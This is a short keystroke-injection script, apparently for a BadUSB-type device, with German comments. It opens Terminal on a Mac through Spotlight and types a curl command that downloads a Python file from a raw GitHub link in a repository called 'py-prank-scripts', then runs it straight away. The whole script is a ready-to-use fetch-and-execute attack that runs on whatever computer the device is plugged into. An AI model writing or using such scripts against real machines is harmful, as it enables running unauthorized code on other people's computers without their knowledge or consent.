layout('de');
typingSpeed(20, 20);

// KOPIERE DEINEN RAW-LINK HIER REIN:
var rawUrl = "https://raw.githubusercontent.com/heydtjonathan-rgb/py-prank-scripts/refs/heads/main/alert.py";

// Befehl für den Mac (öffnet Terminal, lädt Code, startet ihn)
press("GUI SPACE");
delay(500);
type("terminal\n");
delay(2000);
type("curl -L " + rawUrl + " -o a.py && python3 a.py\n");
